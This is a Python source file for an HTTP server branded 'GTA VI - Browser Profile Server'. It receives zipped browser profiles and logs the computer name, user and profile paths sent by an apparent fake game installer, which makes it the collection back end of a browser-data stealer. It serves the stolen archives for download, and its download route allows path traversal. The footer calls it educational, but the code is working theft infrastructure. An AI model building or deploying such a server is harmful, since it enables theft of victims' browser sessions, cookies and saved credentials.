# file_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import os
import json
from datetime import datetime

class FileServerHandler(BaseHTTPRequestHandler):
    
    def do_POST(self):
        if self.path == '/upload':
            try:
                content_length = int(self.headers['Content-Length'])
                file_data = self.rfile.read(content_length)
                
                # Save as ZIP file
                filename = f'browser_profiles_{datetime.now().strftime("%Y%m%d_%H%M%S")}.zip'
                with open(filename, 'wb') as f:
                    f.write(file_data)
                
                print(f'✅ ZIP file uploaded: {filename} ({len(file_data)} bytes)')
                
                # Save to a known location for download
                with open('latest_browser_profiles.zip', 'wb') as f:
                    f.write(file_data)
                
                # Get the actual IP address dynamically
                import socket
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                
                response = {
                    'status': 'success',
                    'message': f'ZIP saved as {filename}',
                    'size': len(file_data),
                    'download_url': f'http://{local_ip}:8000/download/latest_browser_profiles.zip'
                }
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode('utf-8'))
                
            except Exception as e:
                print(f'❌ Upload error: {e}')
                self.send_response(500)
                self.end_headers()
                self.wfile.write(f'Error: {str(e)}'.encode('utf-8'))
        
        elif self.path == '/':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data_str = post_data.decode('utf-8')
                parsed_data = urllib.parse.parse_qs(data_str)
                
                browsers_str = parsed_data.get('browsers', [''])[0]
                computer = parsed_data.get('computer', ['Unknown'])[0]
                user = parsed_data.get('user', ['Unknown'])[0]
                browser_count = parsed_data.get('browser_count', ['0'])[0]
                profile_count = parsed_data.get('profile_count', ['0'])[0]
                zip_created = parsed_data.get('zip_created', ['false'])[0]
                zip_uploaded = parsed_data.get('zip_uploaded', ['false'])[0]
                file_downloaded = parsed_data.get('file_downloaded', ['false'])[0]
                
                browsers = []
                if browsers_str:
                    for browser in browsers_str.split('|'):
                        if ':' in browser:
                            parts = browser.split(':')
                            if len(parts) >= 4:
                                browsers.append({
                                    'name': parts[0],
                                    'version': parts[1],
                                    'profile_path': parts[2],
                                    'profile_size': parts[3]
                                })
                
                print('=' * 80)
                print(f'📊 BROWSER DATA RECEIVED [{datetime.now().strftime("%H:%M:%S")}]')
                print('-' * 80)
                print(f'💻 Computer: {computer}')
                print(f'👤 User: {user}')
                print(f'📁 Browsers: {browser_count}, Profiles: {profile_count}')
                print(f'📦 ZIP Created: {zip_created}')
                print(f'📤 ZIP Uploaded: {zip_uploaded}')
                print(f'📥 File Downloaded: {file_downloaded}')
                print('-' * 80)
                for b in browsers:
                    print(f'  ✓ {b["name"]} (v{b["version"]})')
                    print(f'    📂 {b["profile_path"]}')
                    print(f'    📏 {b["profile_size"]}')
                print('=' * 80)
                print()
                
                with open('browser_data_log.txt', 'a', encoding='utf-8') as f:
                    f.write(f'[{datetime.now().isoformat()}] Computer: {computer}, User: {user}\n')
                    f.write(f'  Browsers: {browser_count}, Profiles: {profile_count}\n')
                    f.write(f'  ZIP Created: {zip_created}, ZIP Uploaded: {zip_uploaded}\n')
                    for b in browsers:
                        f.write(f'  - {b["name"]} (v{b["version"]}) - {b["profile_path"]}\n')
                    f.write('-' * 40 + '\n')
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
                
            except Exception as e:
                print(f'❌ Error: {e}')
                self.send_response(500)
                self.end_headers()
                self.wfile.write(f'Error: {str(e)}'.encode('utf-8'))
    
    def do_GET(self):
        if self.path.startswith('/download/'):
            # Handle file downloads
            filename = self.path.replace('/download/', '')
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/zip')
                self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
                print(f'📥 Downloaded: {filename} ({len(content)} bytes)')
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'File not found')
        
        elif self.path == '/test.txt':
            content = "This is a test file from the server!\n"
            content += f"Generated at: {datetime.now()}\n"
            content += "GTA VI Installer - File Transfer Demo\n"
            content += "========================================\n"
            content += "This file was downloaded by the installer.\n"
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content.encode('utf-8'))
            print(f'📤 Downloaded: test.txt ({len(content)} bytes)')
        
        elif self.path == '/':
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            html = f'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>GTA VI - Browser Profile Server</title>
                <style>
                    body {{ font-family: Arial, sans-serif; max-width: 900px; margin: 40px auto; padding: 20px; background: #f0f0f0; }}
                    .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                    h1 {{ color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }}
                    .status {{ background: #27ae60; color: white; padding: 10px; border-radius: 5px; margin: 10px 0; }}
                    .endpoint {{ background: #ecf0f1; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #3498db; }}
                    .endpoint strong {{ color: #2c3e50; }}
                    .badge {{ background: #3498db; color: white; padding: 3px 10px; border-radius: 12px; font-size: 12px; }}
                    .download-link {{ background: #3498db; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; display: inline-block; margin: 5px 0; }}
                    .download-link:hover {{ background: #2980b9; }}
                    .footer {{ margin-top: 30px; padding-top: 20px; border-top: 2px solid #ecf0f1; color: #7f8c8d; font-size: 12px; text-align: center; }}
                    .ip-info {{ background: #f8f9fa; padding: 10px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #27ae60; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>📦 GTA VI - Browser Profile Server</h1>
                    <div class="status">✅ Server running on 0.0.0.0:8000 (all interfaces)</div>
                    <div class="ip-info">
                        <strong>🌐 Access from other devices using:</strong> http://{local_ip}:8000
                    </div>
                    
                    <h2>📡 Endpoints:</h2>
                    <div class="endpoint">
                        <strong>POST /upload</strong> - Upload ZIP file<br>
                        <span style="color: #7f8c8d; font-size: 12px;">Uploads browser profile ZIP from installer</span>
                    </div>
                    <div class="endpoint">
                        <strong>GET /download/</strong> - Download ZIP file<br>
                        <span style="color: #7f8c8d; font-size: 12px;">Example: <a href="/download/latest_browser_profiles.zip">Download latest ZIP</a></span>
                    </div>
                    <div class="endpoint">
                        <strong>GET /test.txt</strong> - Download test file<br>
                        <span style="color: #7f8c8d; font-size: 12px;"><a href="/test.txt">Download test.txt</a></span>
                    </div>
                    <div class="endpoint">
                        <strong>POST /</strong> - Browser data (text)<br>
                        <span style="color: #7f8c8d; font-size: 12px;">Receives browser information from installer</span>
                    </div>
                    
                    <h2>📁 Files:</h2>
                    <ul>
                        <li><strong>Uploaded ZIP:</strong> <a href="/download/latest_browser_profiles.zip">latest_browser_profiles.zip</a></li>
                        <li><strong>Browser log:</strong> browser_data_log.txt</li>
                    </ul>
                    
                    <h2>💡 How It Works:</h2>
                    <ol>
                        <li>Installer detects browsers on your system</li>
                        <li>Creates a ZIP file with browser profile information</li>
                        <li>Uploads the ZIP to this server</li>
                        <li>You can download the ZIP from the link above</li>
                    </ol>
                    
                    <div class="footer">
                        <p>🛡️ For educational/defensive purposes only</p>
                        <p>Server started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                    </div>
                </div>
            </body>
            </html>
            '''
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
        
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'File not found')

def run_server():
    # Bind to all available network interfaces
    server_address = ('0.0.0.0', 8000)
    httpd = HTTPServer(server_address, FileServerHandler)
    
    import socket
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    print('=' * 60)
    print('📦 GTA VI - BROWSER PROFILE SERVER')
    print('=' * 60)
    print(f'📡 Server: http://0.0.0.0:8000 (all interfaces)')
    print(f'🌐 Access from this machine: http://localhost:8000')
    print(f'🌐 Access from network: http://{local_ip}:8000')
    print(f'📤 Upload: POST /upload (ZIP files)')
    print(f'📥 Download: GET /download/filename')
    print(f'📥 Test: GET /test.txt')
    print('=' * 60)
    print('🔄 Waiting for connections...')
    print('Press Ctrl+C to stop')
    print('=' * 60)
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\n🛑 Server stopped')
        httpd.server_close()

if __name__ == '__main__':
    run_server()